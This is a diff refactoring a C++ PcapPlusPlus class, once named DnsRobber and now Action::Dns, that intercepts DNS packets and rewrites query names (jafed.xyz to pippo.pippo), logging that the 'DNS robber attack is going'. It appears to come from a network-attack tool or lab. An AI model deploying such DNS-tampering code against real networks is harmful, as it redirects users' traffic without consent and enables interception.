@@ -1,4 +1,3 @@
-#include "Action.cpp"
 #include "fstream"
 #include "iostream"
 #include "pcapplusplus/DnsLayer.h"
@@ -16,17 +15,17 @@
 
 using namespace std;
 using namespace pcpp;
-
-class DnsRobber : public Action {
+namespace Action {
+class Dns {
 
 public:
     static const int level = 5;
     int n{2};
 
-    DnsRobber(){};
-    ~DnsRobber(){};
+    Dns(){};
+    ~Dns(){};
 
-    void craftInGoing(Packet *inPacket) {
+    void changeRequest(Packet *inPacket) {
         bool hit = false;
         DnsQuery *q;
         DnsLayer *response = inPacket->getLayerOfType<DnsLayer>();
@@ -37,19 +36,16 @@ public:
             map<string, string> substitutions = {{"jafed.xyz", "pippo.pippo"}, {"www.jafed.xyz", "www.pippo.pippo"}};
             for (auto &dnsname : substitutions) {
                 if (q->getName().compare(dnsname.first) == 0 && q->setName(dnsname.second)) {
-                    DEBUG("\t>> DNS robber attack is going: " << dnsname.first << " --> " << dnsname.second << endl);
+                    cout << "\t>> DNS robber attack is going: " << dnsname.first << " --> " << dnsname.second << endl;
                 }
             }
-            this->shots++;
         } while ((q = response->getNextQuery(q)) != NULL);
         inPacket->computeCalculateFields();
         return;
     };
 
-    void craftOutGoing(Packet *inPacket) {
-    }
-
-    static bool isDns(Packet *p) {
-        return p->getLastLayer()->getProtocol() == DNS;
+    static bool isProto(Packet *p) {
+        return p->getLastLayer()->getProtocol() == pcpp::DNS;
     }
 };
+} // namespace Action
